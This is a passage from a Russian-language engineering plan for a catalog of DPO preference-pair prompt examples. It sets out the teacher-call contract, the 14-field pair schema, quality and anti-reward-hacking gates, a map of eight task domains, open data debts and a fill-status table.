   диагностический self-report `current_output_is_already_optimal`). Лицензию, provenance,
   легальный вердикт, приёмку собирает ДЕТЕРМИНИРОВАННЫЙ C#-адаптер
   (`TeacherProvenanceAdapter`, plan-09 :501 — «LLM provenance не пишет»; `LocalOllamaTeacherClient`,
   overlay §5). Примеры каталога НЕ смеют просить учителя «оценить себя», «принять пару»,
   «заполнить provenance».
5. **`requirements` = рубрика скорера.** В `requirements` кладутся ровно те пер-доменные
   проверки, которыми независимый `IndependentDomainScorer` будет мерить кандидатов (overlay
   :159/:180/:200; plan-09 §3 Шаг 5). Учитель оптимизирует то, что судья реально измеряет — это
   легально, потому что арбитр НЕЗАВИСИМ и детерминирован (acceptance-signal independence,
   plan-09 :504–:513).
6. **`wrong_markers` = ориентиры «чего не делать».** Известные классы ошибок задачи
   (таксономии §2.3) кладутся в запрос как ориентиры; в ТРЕНИРУЕМОЕ представление `rejected`
   маркеры НЕ попадают (см. §1.3 п.4 — срез до токенизации).
7. **Язык промпта.** Мультиязычность позволяет писать `task`/`requirements` по-русски
   (читаемо для Luba); имена полей `output_schema` — фиксированный английский JSON (машинный
   контракт).
8. **Судьба ответа (наш overlay `ChosenSelectionRule` :242–:254).** K кандидатов учителя
   `g_1..g_K` → `IndependentDomainScorer` → `Y_goal := argmax_k Score(g_k)` (best-of-K ЦЕЛИ
   учителя). `chosen = Y_goal ⇔ Score(Y_goal) > Score(Y_best)`, иначе `chosen = Y_best`
   (лучший кандидат УЧЕНИКА из P-06). Непобедившие генерации учителя `g_k` (k≠argmax) —
   eval-only: они НЕ становятся `rejected` и НЕ входят в fan-out (plan-07). Слабый учитель
   даёт МЕНЬШЕ принятых пар, но не худшие (fewer-accepted-not-worse).

**Границы прав по нашему канону (важно для легальности примеров).** `TP1_LOCAL` (и
`TP2_HOSTED`) до `G-DPO-FINAL` — только eval/quarantine: `DpoTrainReady=false`, никакой
материализации train-ready пары, никакого `TrainBatchAsync`, никакого промоушена checkpoint
(overlay :48). Значит любой пример каталога — это ФОРМА будущей пары, а не построенная
train-ready строка.

### §1.2 Как промптовать СТУДЕНТА (обучаемая единица, from-scratch)

Промптинг студента — НЕ свободный текст, а типизированные контракты конвейера стадий
(`raw prompt → StructuredTaskContract → OrchestrationScenarioPlan → SkillSelection`;
анти-replay: стадия 2 сырой промпт не видит). Поэтому у КАЖДОГО примера каталога ДВЕ
проекции:
- **(а)** как unit-level запрос УЧИТЕЛЮ (bounded, §1.1);
- **(б)** как вход/выход обучаемого юнита СТУДЕНТА (поля `InputContext/Chosen/Rejected`
  канонической пары `GraphDpoPair`).

Студент v1 = from-scratch C#-юниты + `LlmModel` (потолок ≤3–4B / узкая специализация),
т.е. примеры обязаны быть достижимы МАЛОЙ моделью: короткие структурные выходы, не
свободные эссе.

### §1.3 Механика DPO positive/negative пары (канон — наш блок 07 + overlay + датасеты RAG)

1. **Пара = chosen/rejected в каноне `GraphDpoPair` (ровно 14 полей; владелец — plan-07 §3.2
   :232–:261 / record :887–:901).** Точный список 14 полей воспроизведён в §1.4 ниже.
   `TeacherProvenance` — обязательное nested-поле (20 полей, владелец plan-08 §3.1), заполняет
   C#-адаптер, не LLM.
2. **Негатив = Error-Injection с РОВНО ОДНОЙ главной ошибкой.** Аннотация строго
   `[WRONG: код — описание — последствие]`; составные коды допустимы, но с ОДНОЙ главной;
   запрещены пустые метки (`bad plan`, `too vague`, `not good`). Негатив обязан быть
   ПРАВДОПОДОБНЫМ (нормальный, но flawed вариант), не отказом и не мусором.
3. **Гейты качества negative-пары G1–G6 (владелец списка — датасет `RAG-10` pass 6 §6.6 в папке
   источника):** G1 правдоподобие; G2 код таксономии указан; G3 `[WRONG:]` присутствует; G4
   token-overlap positive↔negative в окне **0.45–0.75** (`overlap_ratio`: <0.45 слишком
   разные/лёгкие, >0.75 почти копия/низкий margin) — это и есть «reward-margin 0.45–0.75
   overlap» из R-10; G5 не почти-копия; G6 ошибка типична для домена. Пер-доменное отличие:
   у переводов действует СВОЙ set-based overlap-гейт (`RAG-03`: `overlap_ratio>0.60 → discard`)
   — проход PE-3 применяет доменный гейт, не смешивая каноны.
4. **Маркер срезается ДО обучения.** `[WRONG:]`-тег живёт в поле `WrongMarkers` и в
   `rejected`-тексте ИСТОЧНИКА, но из тренируемого `rejected`-представления срезается до
   токенизации — иначе тренер учит детекцию тега, а не качество.
5. **Reward-скаляризация (наш plan-07 :341–:360; SI_GATE_3 trainable-architecture-decision).**
   Для структурных сторон (план/код/док/SQL/html+css) reward каждой стороны определён над
   сериализацией кандидата:
   ```text
   reward(side, input_context) = Beta * ( policyLogP(SerializeCandidate(side) | input_context)
                                          − referenceLogP(SerializeCandidate(side) | input_context) )
   chosenReward   = reward(chosen,   input_context)
   rejectedReward = reward(rejected, input_context)
   margin = chosenReward − rejectedReward
   ```
   Судейские/структурные скоры (`IHeldOutScorer.Score`, ранжирование) выбирают/аудируют
   `Y_best` только как `preference_score`-провенанс — они НЕ заменяют `reward(side)` для DPO-margin
   и НЕ авторствуют `chosen`/`rejected` (plan-07 :355–:357). Сторона, которую нельзя
   скаляризировать, → `REWARD_EXTRACTOR_MISSING` (plan-07 :360); определение reward нельзя
   откладывать. `margin ≤ 0.05` или `overlap_score ≥ 0.60` → `LOW_CONTRAST`, не учим (plan-07
   :520).
6. **Предохранители самой пары.** `ORCH-10 Low Signal Negative` и `PromptError-08 Poor Negative
   Examples` — метки ОТБРАКОВКИ пары до обучения, а не классы для обучения модели.
7. **Anti-reward-hacking (уроки `RAG-03`, обязательные для каждого примера):** (а) НЕ
   константный промпт на весь батч; (б) НЕ length-hack (короткий-хороший vs длинный-плохой);
   (в) НЕ confidence-leakage (уверенность 0.90–0.97 у chosen vs 0.45–0.55 у rejected как скрытый
   признак); (г) НЕ measurement circularity (метрика приёмки не производна от train-строк);
   (д) `chosen==rejected` запрещён хард-гейтом; (е) без mojibake/порчи скрипта (для не-латиницы).
8. **Независимость сигнала приёмки (plan-09 :504–:528).** `acceptance_signal_source !=
   teacher_self_report` И `!= trained_unit_self_confidence`; власть над `chosen` у auto-DPO пар —
   ТОЛЬКО `IndependentDomainScorer`; у user/acceptance-пар — реальный accept/reject
   пользователя. Best-of-K по self-logprob учителя = `forbidden_self_label` (SI_GATE_7, plan-09
   :496,:543).
9. **Source-disjoint (`HeldOut`).** Held-out строки — из ДРУГИХ источников, чем train (не
   авторские сценарии раннера); `HeldOut` — поле пары; лексический Jaccard-guard train↔eval
   ловит утечку, которую exact-prompt-гейт не видит.
10. **Fan-out.** N>1 проигравших → winner-vs-each-loser, N−1 отдельных пар; поле `Rejected`
    НИКОГДА не несёт список (SI_GATE_4 cardinality fan-out).
11. **Карантины (обязательные классы у каждого типа задачи):** легальный (закрытая
    проприетарная модель как teacher для common → `DATASET_REBUILD_REQUIRED`); privacy
    (приватные токены проекта без redaction → только adaptive-нога `.xiigen`,
    `BLOCK_FOR_COMMON`); leakage (`candidate_index`/`source_path`/`source_id`/`file_order`/
    `correlation_id`/`exact_prompt` во входе → отклонение builder-ом, поле `ExcludedLeakageSignals`).

### §1.4 CANON: 14 полей `GraphDpoPair` (воспроизведено из plan-07 §3.2 :246–:261 / record :887–:901)

Владелец типа — блок плана 07. Ровно 14 полей, БЕЗ изменений (никакого 15-го поля):

```text
GraphDpoPair (current 14-field canon; owner block 07):
  1  PairId
  2  Level                      // train-ready ОБЯЗАН быть "unit"
  3  NodeOrEdgeId               // для train-ready unit-level DPO — это id/ref юнита
  4  InputContext
  5  Chosen
  6  Rejected
  7  WrongMarkers[]
  8  Reason                     // >=24 символов (Gate B)
  9  TeacherProvenance          // nested 20-полевой record; владелец блок 08
  10 SourceIds[]
  11 HeldOut
  12 CandidateOrderInvariant
  13 ExcludedLeakageSignals[]   // candidate_index, source_path, source_id, file_order, correlation_id, exact_prompt
  14 DpoTrainReady              // ГЕЙТ, не флаг-по-умолчанию (§3.3 шаг 6)
```

Диагностические/строительские поля (`RejectedOrigin`, `LegScope`, `OverlapScore`,
`SplitProofRef`, `RowRejectionReason`) живут в `TriadVerdict`/боковом манифесте, НЕ на канон-строке
(plan-07 :286–:302,:907–:912). Order-feature carrier — существующий триплет промпта: `chosen`
сериализует принятые `OrderedPatternIds`, `rejected` — отклонённые near-miss `OrderedPatternIds`,
`InputContext` несёт общий структурный конверт БЕЗ leakage-сигналов (plan-07 :263–:280); 15-е
поле не добавляется.

Вложенный `TeacherProvenance` — 20 полей (владелец plan-08 §3.1 :389–:409), заполняет
`TeacherProvenanceAdapter` (не LLM):

```text
TeacherProvenance (20 полей = 13 базовых + 5 NEW + 2 RR6):
  13 базовых: teacher_access_mode; hosting_provider; model_id; model_license; model_version;
              request_id; provider_terms_checked; teacher_output_used_for_training;
              closed_proprietary_model; source_ref; source_sha256; contamination_markers; judge_model
  5 NEW:      terms_snapshot_ref; geography_export_constraint; source_category;
              raw_private_text_copied; redaction_policy_ref
  2 RR6:      service_mode (enum plain|grounding|web_search|retrieval_tool|code_exec|unknown);
              grounding_used (bool)
```

---

## §2. СХЕМА КАТАЛОГА: 6-блочный шаблон одной задачи + правило именования таксономий

### §2.1 Шаблон «один тип задачи» (скелет; заполняют проходы PE-2..PE-9)

Каждый проход PE-N (N=2..9) заполняет для СВОЕГО типа задачи ровно этот шаблон. Все 6
блоков обязательны; пустой блок = проход не принят.

```text
ШАБЛОН PE-<N> «<тип задачи>»
1. ДОМЕН РЕАЛИЗАЦИИ: владелец-домен/машина/юнит (из карты §3) + адресация пары
   (GraphDpoPair.Level = unit|node|edge; NodeOrEdgeId = <конкретный id по паттерну карты>).
2. POSITIVE (chosen) ПРИМЕР ПРОМПТА:
   (а) bounded teacher-call (plan-09 §Шаг 3a) — ЗАПОЛНЕННЫЙ request-JSON
       {task, target_unit, input_context, current_best_output, requirements, wrong_markers, output_schema}
       в бюджете num_ctx≈8192; requirements = рубрика доменного скорера (карта §3, колонка «скорер»);
   (б) ожидаемая форма ХОРОШЕГО выхода (goal_text: структура, не эссе; достижимо студентом ≤3–4B);
   (в) какие пер-доменные проверки IndependentDomainScorer выход обязан пройти.
3. NEGATIVE (rejected) ПРИМЕР: ТА ЖЕ задача с РОВНО ОДНОЙ внедрённой ошибкой;
   аннотация [WRONG: <канонический код + имя ЛИБО явный доменно-локальный код> — <описание> — <последствие>];
   правдоподобный (нормальный, но flawed), не отказ; проходит G1–G6 (G4 overlap 0.45–0.75;
   у переводов — доменный гейт RAG-03 >0.60 discard).
4. DPO-PAIR-READINESS БЛОК: эскиз 14-полевой проекции GraphDpoPair (все 14 полей §1.4;
   TeacherProvenance = указатель на 20-полевой канон plan-08 §3.1, заполняет C#-адаптер)
   + LegScope (common | PersonalAdaptive) + source-disjoint нота (HeldOut) + reward-scalarization
   (структурная сторона -> logprob-margin plan-07 :341–:360; сигнальные множества -> F1 vs gold).
5. ГЕЙТЫ ЧЕСТНОСТИ ПРИМЕРА: wrong-marker срезается до обучения (§1.3 п.4);
   acceptance-signal independence (скорер решает, не self-report); margin > 0.05 (не LOW_CONTRAST);
   anti-reward-hacking чеклист §1.3 п.7 (а)–(е); карантин-классы §1.3 п.11 применимость.
6. ИСТОЧНИК РЕАЛИЗМА: какой файл/домен/датасет обосновывает пример (read-only цитата с путём file:line)
   — пример обязан быть «в соответствии с реализацией», не выдуман.
```

**Формат размещения:** каждый проход PE-N добавляет свой заполненный шаблон отдельной секцией
`## Prompt-Examples проход N/10 — <тип задачи>` в конце ЭТОГО файла (кумулятивный стиль) И
обновляет ОДНУ строку статус-таблицы §5.2 (single-owner носитель заполнения; правило
stale-status-carrier FC-44: закрытие статуса свипает и заголовок, и строку статуса в ОДНОМ шаге).

### §2.2 FC-44 single-owner дисциплина каталога (plan-review-SKILL §FC-44)

- Этот файл — НОВЫЙ единый владелец каталога. Он НЕ создаёт второй канон полей пары /
  provenance / контракта учителя — только ССЫЛАЕТСЯ на владельцев (plan-07/08/09/overlay) и
  ПРОЕЦИРУЕТ. Дублирование канон-строки с расхождением счётчика = `dual-live-canon`
  (admission-blocking).
- Статус-таблица §5.2 — единственный носитель статуса заполнения задач. Заголовок файла
  (front-matter) и строка §5.2 обновляются в ОДНОМ шаге при закрытии задачи, иначе
  `stale-status-carrier`.
- Каждая задача карты §3 обязана иметь shortname→физический путь + строку карты (source-addressability).

### §2.3 Правило именования таксономий негативов (канонические имена, без второго канона)

- **Канонический владелец имён кодов** (папка источника, датасет `RAG-10` pass 6 §6.2/§6.3):
  оркестрация — `ORCH-01..10`; стадия prompt-to-task — `PromptError-01..12`. Критические классы:
  `ORCH-03 Deterministic Shortcut`, `ORCH-08 Product Decision Masquerade`, `PromptError-02 No DNA
  Safety`, `PromptError-05 Deterministic Shortcut`, `PromptError-07 Product Decision Masquerade`.
- **Binding-правило для PE-2..PE-9:** каждый негатив использует `канонический код + каноническое
  имя` (после тире — свободное описание конкретного дефекта и последствия). Дефект, не
  мапящийся ни на один канонический код, получает ЯВНЫЙ доменно-локальный код (например
  translation-коды `RAG-03`: `mistranslation, false_cognate, literal_calque, omission, addition,
  morphological, register_shift, rtl_error, back_translation_divergence, named_entity`).
  ПЕРЕИМЕНОВЫВАТЬ канонические номера ЗАПРЕЩЕНО (no dual-canon).
- **Observation (evidence-only, НЕ починка этого прохода):** иллюстративные строки тела
  плана-источника несут описательные ярлыки, не совпадающие с каноническими именами
  (`ORCH-04 Missing Gates` при каноне `ORCH-04 = Scope Creep` и т.п.). Эти строки — evidence-only
  примеры своих проходов; выравнивание/аннотация — кандидат-пункт свипа PE-10, не блокер PE-1.

---

## §3. КАРТА 8 задач → домен реализации + доменный скорер + источник примеров

| # | Тип задачи | Домен/машина реализации | Адресация пары (Level / NodeOrEdgeId-паттерн) | Таксономия негативов | Доменный скорер (ось проверок) | Источники реалистичных примеров (read-only) | Проход |
|---|---|---|---|---|---|---|---|
| 1 | Оркестрация | `OrchestrationPlanMachine` (42) + конвейер стадий 43 + L5-граф `ILearningDynamicGraph` (узлы/рёбра) | `node`/`edge`; `graph/edge/stage1-dispatch` | `ORCH-01..10` (+ `PromptError-01..12` на стадии 1) | структурная валидность плана: bounded phases + gates, покрытие сигналов, candidate-set validity | `RAG-02` (wiki/plugin-контур), `RAG-10` §6, §P4-B этого плана | PE-2 |
| 2 | Переводы | `27.TranslationDomain` (пилот language-translate доски `dpo legal build`) | `unit`; `translation/<направление>/<семья>` | доменные коды `RAG-03` (mistranslation, false_cognate, literal_calque, omission, addition, morphological, register_shift, rtl_error, back_translation_divergence, named_entity) | exact-match + char-accuracy; терминология/глоссарий; placeholder byte-exact (`{0}`,`%s`,`{{var}}`); язык/числа/формат | `RAG-03` (иврит→En + RU_EN пары, T01–T09, хард-гейты) | PE-3 |
| 3 | Серверный код | .NET-сторона xiigen (`xiigen-platform`/`xiigen-flows`: `src/Xiigen.*`; DNA `DataProcessResult<T>`/`CancellationToken`) | `unit`; `server-code/<репо>/<слайс>` | `PromptError-01..12` (особенно 02 No DNA Safety, 05 Deterministic Shortcut) + доменно-локальные DNA-коды | форма-валидность компиляции, контрактные проверки DNA-паттернов, рубрики code-review quality-gates | `RAG-07` (23 quality-gate рубрики; SWE-bench MIT), живые `src/Xiigen.*` (spot-read) | PE-4 |
| 4 | Клиентский код | Angular-сторона xiigen (`xiigen-flows` `flows/FLOW-NN-*/client/angular/`) | `unit`; `client-code/<репо>/<слайс>` | `PromptError-01..12` + доменно-локальные (Angular-специфика) | форма-валидность компонента/сервиса, контракты API-границы, quality-gate рубрики | `RAG-07` (NESTJS/REACT-ADVANCED как паттерн), живой Angular-код xiigen-flows (spot-read) | PE-5 |
| 5 | Серверная документация | `42.ProjectWikiDomain`: documentation pipeline / local-wiki над .NET-кодом (`project_documentation_pipeline`; приватность `.xiigen`) | `unit`; `server-docs/<проект>/<файл>` | `PromptError-09` Missing Documentation Sync, 11 Vague Deliverables, 12 Context Dependency + `ORCH-02` Missing Evidence | grounding-проверка: каждое утверждение ссылается на реальный код-факт (anti-hallucination; порог из `RAG-02`) | `RAG-02` (wiki-модель, .NET tier), `RAG-10` §6 | PE-6 |
| 6 | Клиентская документация | тот же 42-домен над Angular-кодом (платный Angular-домен по лицензионному сплиту `RAG-02`) | `unit`; `client-docs/<проект>/<файл>` | те же, что #5 | те же, что #5 (+ терминология фреймворка) | `RAG-02`, живой Angular-код (spot-read) | PE-7 |
| 7 | Хранимые процедуры | SQL-слой xiigen-систем (.NET+Angular+SQL); по сплиту `RAG-02` SQL — именованный отдельный домен | `unit`; `stored-proc/<база>/<процедура>` | `PromptError-01..12` + доменно-локальные SQL-коды (задаёт PE-8) | синтаксис-валидность, контракт вход/выход процедуры, идемпотентность/транзакционность (рубрику задаёт PE-8) | долг локации: реальных процедур в 4 репо мало/нет → synthetic-seed-forward генератора 42-домена (см. §4) | PE-8 |
| 8 | HTML-CSS | `44.DesignConversionDomain` (design→код: html+css→server→trained model→visual QA→DPO) + `FigmaToCode` Element/Style IR (baseline) | `unit`/`node`; `design-conversion/<макет>/<фрагмент>` | `ORCH`-таксономия на маршрутизации + доменно-локальные визуальные коды (задаёт PE-9) | visual QA ось `RAG-04` (скриншот/структурные проверки), Element/Style IR-валидность; порог качества server-owned | `RAG-04` (живой working-set 44), `RAG-11` (FigmaToCode 18-шаговый движок) | PE-9 |

**Честные ноты карты (source-addressability + грунт):** (а) строка #7 несёт открытый вопрос
локации SQL-источников — spot-scan НЕ нашёл реальных хранимых процедур на малой глубине; PE-8
обязан либо найти реальные процедуры, либо честно строить примеры от контракта (synthetic-seed),
записав это; маппинг «хранимые процедуры = SQL-домен» стоит по директиве Luba и лицензионному
сплиту `RAG-02`. (б) строки #5/#6 наследуют главный урок `RAG-02`: base-модель документации
ПРОВАЛИЛА held-out — примеры doc-задач обязаны быть grounding-проверяемыми, не свободным
пересказом. (в) строка #4 (клиентский код): живой Angular существует в `xiigen-flows`
(`flows/FLOW-NN-*/client/angular/`); `xiigen-platform` Angular-клиента не несёт (чистый .NET);
клиент `xiigen mvp` = React — PE-5 обязан подтвердить дом живым spot-read. (г) все 8 строк живут
ПОД PLAN-ONLY: каталог — plan-content/данные, capability-заявлений не делает.

---

## §4. ЧЕСТНЫЕ ДОЛГИ (где данных мало — переносится в проходы, не скрывается)

Эти долги обязаны быть явно отработаны своими проходами; проход не принят, если долг замолчан.

1. **SQL / хранимые процедуры (PE-8) — 0 реального корпуса. [ОТРАБОТАНО PE-8, VERIFIED counted spot-scan
   ЭТИМ проходом.]** Локация-долг закрыт СОБСТВЕННЫМ counted-свипом PE-8 (см. PE-8.1 таблицу):
   **VERIFIED — 0 реальных `CREATE PROC(EDURE)` определений и 0 tracked `*.sql` во ВСЕХ 5 доступных репо**
   (`xiigen-flows-dot-net-angular`, `-DpoImplementation`, `xiigen-platform-dot-net-angular`,
   `-DpoImplementation`, `llm_mvp_core`); `find -iname "*.sql"` = 0 файлов на ФС; `DbContext` в flows = 0.
   Единственные текстовые хиты `CREATE PROC` — это ЛИБО живая платформенная абстенция
   `ABSTAIN_NO_SOURCE` (`SmartWikiServiceTests.cs:137–:141`), ЛИБО синтетические тест-фикстуры
   (`ProjectWikiDomainTests.cs:2532,:2613`), ни одного продуктового определения.
   **Честная нота-расхождение с образцом-Fable:** его строка «`xiigen mvp` = 1 tracked `outbox.schema.sql`
   (0 процедур)» относится к репо `xiigen mvp` (React-клиент), которого на ЭТОЙ машине НЕТ → записан
   CITED-not-verified (PE-8.6), вывод «0 реальных SP» этим лишь усилен. **Долг, который ОСТАЁТСЯ:** сама
   способность генерировать/исполнять процедуры = долг — домен строится `SYNTHETIC_SEED-forward` от живого
   синтетического SP-корпуса генератора 42-домена (`BuildStoredProcedureUnits :293–:327`); real-corpus
   unlock = static `.sql` с процедурами ЛИБО consent-gated извлечение (`ISqlConsentGate`, default DENY).
   `DpoTrainReady` для этой задачи — `false` [условно от M1 + source-кавета + G-DPO-FINAL], флип против
   образца-Fable (`true`).
   **[FIX-RES-1 / B3] Формализация цепочки разблокировки настоящей SP-способности (не переоткрытие анализа PE-8; долг локации ОТРАБОТАН — это разложение того, что закрывает `SYNTHETIC_SEED`→capability).** Цепочка из 4 звеньев:
   (1) **real-corpus unlock** = статические `.sql` с определениями процедур ЛИБО consent-gated извлечение через `ISqlConsentGate` (default DENY, приватные БД);
   (2) **M1/Ф3 pair-builder + T-SQL scorer/парсер** — сейчас НЕ существуют (нет builder'а пар, нет доменного T-SQL-скорера/парсера);
   (3) **архитектурный дом** = SP-ветка `42.ProjectWikiDomain` + REFERENCE `Sql/` (контракты `ISqlConnectionExtractor`/`ISqlConsentGate`/`ISqlObjectExtractor`/`SqlWikiDocumentationOrchestrator` — кода нет, только референс);
   (4) **`G-DPO-FINAL`** (legal predicate proof). Исполнение самих процедур — ОТДЕЛЬНАЯ consent-gated runtime-способность, не часть DPO-обучения. Это код/execution-долг (владелец плана/доски), НЕ этот PLAN-ONLY проход.
2. **Переводы (PE-3) — токенайзер / нулевой seed по ивриту.** Иврит→En = 0-pair seed на старте
   (нет посаженного корпуса пар); доменный overlap-гейт `RAG-03` (>0.60 discard) действует ВМЕСТО
   окна 0.45–0.75; честный `DpoTrainReady:false` до токенайзер/seed Phase-0. Anti-reward-hacking
   уроки `RAG-03` (константный промпт, length-hack, confidence-leakage, measurement-circularity) —
   обязательны.
3. **HTML-CSS (PE-9) — эхо-судья (echo-judge Phase-0). [ОТРАБОТАНО PE-9, VERIFIED counted spot-read ЭТИМ проходом.]**
   Домен 44 несёт ловушку acceptance-independence: критик приёмки = эхо-константа. **VERIFIED spot-read PE-9:**
   `critic.Confidence == verdict.Score` (`DesignConversionTrainedUnits.cs:47`), причём `verdict.Score = verdicts.Min(Score)`
   (:82 — простая агрегация входных QA, НЕ обученное суждение), И `improver.Confidence == input.CriticVerdict.Score`
   (:250), `Accepted == input.CriticVerdict.Passed` (:235); внешний visual-judge НЕ сконфигурирован по умолчанию
   (`NoConfiguredVisualJudge` → Score 0.0 blocked, `DesignConversionVisualJudge.cs:376+`; локальный судья
   `DefaultLocalDesignConversionVisualJudge` :78–:189 = детерминированный metadata-скорер, `external_ai_visual_judge_executed:false`),
   `PassesGate:false` (`DesignConversionMachine.cs:125`), синтетический DPO-baseline (`chosenScore=Max(0.01, ...Verdict.Score)`,
   `DesignConversionDpoGenerator.cs:1115`), Route B (мост → `11.DPO/DpoTrainer`) пуст, 0/10 e2e. Штраф 0.40/потолок 0.60
   metadata-компаратора — CITED (из этого п.3/RAG-04; `DesignConversionQaProviders.cs` этим пассом не перечитан), но
   ЭХО-отношение подтверждено VERIFIED. Честный `DpoTrainReady:false` держит ЭТОТ Phase-0-блок (эхо-судья), не только
   G-DPO-FINAL — ЕДИНСТВЕННЫЙ код-домен каталога с настоящим доменным Phase-0-блоком в АРБИТРЕ ПРИЁМКИ; замена эхо-судьи
   независимым доменным скорером (+ Route B мост + M1) = реальный таргет ремонта. Reward-scalarization (SI_GATE_3): ось
   `VisualVerdict.Score` ИСКЛЮЧЕНА из `reward(side)` (logprob-margin нормализованной разметки) И из `Q_struct`
   (детерминированный парсер) до Phase-0 — приёмка не берётся ни из improver-юнита, ни из эхо-константы (SI_GATE_7).
   XSS-негатив = teaching-negative под security-карантином (rejected-markup text-only, НЕ исполняется). Канонического
   XSS-арбитра в `RAG-07` НЕТ — PE-9 задал доменно-локальный `dcm_xss_unsanitized_markup` (якорь — живой unescaped
   `containingString` FigmaToCode, VERIFIED `element-code.ts:130–:151`).
   **[FIX-RES-1 / B2] Формализация замены эхо-судьи (не переоткрытие: сам долг ОТРАБОТАН и VERIFIED PE-9; это разложение таргета ремонта).** Классификация: замена эхо-судьи = **code-repair ВНЕ каталога** — этот PLAN-ONLY каталог несёт ТОЛЬКО наблюдение, продуктовый код не трогает. Целевая архитектура замены: убрать эхо-константу приёмки (`critic.Confidence == verdict.Score`) и поставить **независимый `Q_struct`-скорер как арбитр приёмки** — `SI_GATE_7`: `acceptance_signal != trained_unit_self_confidence != echo_judge_constant`. Реализация цели = настоящий обучаемый визуальный judge как `IDesignConversionCriticUnit : ILogicalUnit` внутри L5 `DesignConversionMachine`, обучение через **Route B → `11.DPO/DpoTrainer`** с полным лайфциклом (checkpoint save/load, held-out eval, fresh-load, continue-training). Ложится в борд-строку продукта под `REAL_TRAINER_ROUTE_B_GATE`; владелец = план/доска, НЕ этот проход.
4. **Серверная/клиентская документация (PE-6/PE-7) — измеренный провальный baseline + grounding.**
   base-модель документации провалила held-out (`RAG-02`): примеры обязаны быть
   evidence-grounded (каждое утверждение с `file:line`), критический доменно-локальный
   `doc_hallucinated_claim` (класс, ОТСУТСТВУЮЩИЙ в живой таксономии генератора). Клиентская
   ветка (PE-7): grounding-долг — wiring-doc семья заблокирована до реального подключения
   клиентов; baseline мерился на .NET-корпусе и на Angular не переносится (TS PENDING).
   **[FIX-RES-1 / B4] Определение задачи ИЗМЕРЕНИЯ «TS-baseline» (задача измерения, НЕ продуктовое решение Luba; закрывает PENDING в G1 строки 6).** Это тот же held-out прогон, что дал .NET-числа (`generic_documentation_qa_accuracy` @0.90, `hallucination_rate` @0.00, каталог `:2354`), но над Angular/TS-корпусом. Held-out кандидаты уже названы PE-7 (`constructor` URL-парсинг `:57–:74`, `applyLanguage` RTL `:121–:125` — НЕ submit-семья train-якорей). ОБЯЗАТЕЛЬНЫ: source-disjoint + лексический Jaccard-guard (47 клиентов = шаблонные клоны, иначе train/test-утечка); тот же `scorer_id`/`version`/`threshold_set` через границу (Гейт 6a). Раннер = plan-11 `IGraphMeasurementRunner` (`:842–:846`). Выход = пара чисел «TS-baseline» (accuracy + hallucination_rate над TS). Это execution-измерение (реализуй), НЕ открытое plan-решение.
5. **Клиентский код (PE-5) — корпусная кавета static-demo.** Живые Angular-клиенты — статические
   демо (mало HTTP/подписок в проде); `DpoTrainReady:true [условно от M1]` с корпусной каветой.
   LegScope = PersonalAdaptive (paid=Angular по сплиту `RAG-02`, не free-common .NET-домен сервера).
6. **Общий долг легальности всех задач.** До `G-DPO-FINAL` (overlay :48–:53) любой teacher-выход —
   eval/quarantine (`DpoTrainReady=false`); train-ready материализация и `TrainBatchAsync` только
   после полного predicate proof + Luba-approval. Значит `[условно от M1]` в статусах задач —
   честная зависимость от закрытия execution-гейтов `TP1_LOCAL`, а не «уже готово».
   **[FIX-RES-1 / B1] hosted acceptance number = `RESOLVED_BY_LUBA_LIVE` 2026-07-14.** Числовой критерий приёмки hosted-этапа TP2 (Qwen3-235B) принят Luba: hosted-переход принимается, если `HeldOutAccuracy(Y_goal_TP2) >= 0.90` (переиспользует существующий порог `generic_documentation_qa_accuracy`). Это разрешает ТОЛЬКО ранее открытый narrowed-остаток «числовой критерий приёмки» строки `Q-TP-235B-EVAL` (owner-зеркало `active-codex-execution-07-execution-gates-open-questions.md`, там тоже вписано). **Легальность/методика `Q-TP-235B-EVAL` НЕ трогается** — hosted-вызов (включая eval) ТОЛЬКО после `G-TP-4`, уже `RESOLVED_FROM_DOCUMENTED_AUTHORITY`. Общий `G-DPO-FINAL` legal-долг ОСТАЁТСЯ открытым (это НЕ hosted acceptance number). **Нейтральная нота-риск для исполнителя (НЕ переигрывать решение):** канон-риск варианта абсолютного пола — на слабых доменах `>= 0.90` может не достигаться → возможен вечный `BLOCK`; митигация (per-domain пол ИЛИ budget-bounded fallback) остаётся open EXECUTION-наблюдением, если исполнитель упрётся.

---

## §5. АЛЛОКАЦИЯ проходов PE-2..PE-10 + статус-таблица + handoff в PE-2

### §5.1 Аллокация

- **PE-2** Оркестрация; **PE-3** Переводы; **PE-4** Серверный код; **PE-5** Клиентский код;
  **PE-6** Серверная документация; **PE-7** Клиентская документация; **PE-8** Хранимые процедуры;
  **PE-9** HTML-CSS — каждый по шаблону §2.1, с обновлением своей строки статус-таблицы §5.2.
- **PE-10** Консолидация: сквозная проверка всех 8 примеров против G1–G6 + §1.3 п.7
  (anti-reward-hacking) + канона имён §2.3; DPO-pair-readiness вердикт по каждой задаче; сводная
  `DpoTrainReady`-матрица 8 строк; привязка каталога к хребту DPO-build (WO-M1.1) и доменам;
  кандидат-свип расхождения имён из §2.3; финальная parity/counter re-stamp. Если консолидация
  потребует РЕАЛЬНЫЙ новый WO — счётчик двигается ТАМ, с обновлением всех живых носителей.

### §5.2 Статус-таблица каталога (single-owner носитель заполнения; обновляет каждый проход PE-N)

| Тип задачи | Проход-владелец | Статус примера (positive + negative) |
|---|---|---|
| Оркестрация | PE-2 | ✅ ЗАПОЛНЕНО PE-2 **[FIX-PE-2]**: positive (bounded teacher-call plan-09 §Шаг 3a + goal_text + student-проекция) + 5 канонических негативов (`ORCH-03`/`ORCH-08`/`ORCH-01`/`ORCH-09`/`ORCH-02`) + DPO-pair-readiness (14 полей, fan-out 5 пар, `DpoTrainReady=false` условно G-DPO-FINAL) + гейты честности + источники реализма (живой код 42/43) — секция «Prompt-Examples проход PE-2/10» |
| Переводы | PE-3 | ✅ ЗАПОЛНЕНО PE-3 **[FIX-PE-3]**: positive (bounded teacher-call plan-09 §Шаг 3a HE_EN + Y_goal идиоматичный byte-exact + student-проекция с токенайзер-каветой) + 5 негативов (3 канонических `RAG-03` `mistranslation`/`omission`/`literal_calque` + 2 честных доменно-локальных `language_leak`/`number_format_loss`) + DPO-pair-readiness (14 полей, fan-out 5 пар, SET-BASED overlap>0.60→discard с runtime-каветой 0.50, `DpoTrainReady=false` по токенайзеру Phase-0 + синтетике + G-DPO-FINAL, Hebrew=0-pair дыра) + гейты честности (реальные reward-hack'и RAG-03) + источники реализма (живой код `27.TranslationDomain` + RAG-03) — секция «Prompt-Examples проход PE-3/10» |
